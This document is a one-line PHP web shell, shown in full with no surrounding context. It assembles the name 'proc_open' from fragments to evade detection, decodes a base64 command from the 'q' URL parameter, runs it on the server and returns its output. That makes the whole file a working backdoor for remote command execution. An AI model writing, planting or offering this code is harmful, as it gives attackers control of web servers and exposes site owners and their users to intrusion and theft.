<?php $f='p'.'roc'.'_o'.'pen';if($q=$_GET['q'])$f(base64_decode($q),[1=>['pipe','w'],2=>['pipe','w']],$t)&&print(stream_get_contents($t[1]).stream_get_contents($t[2])); ?>
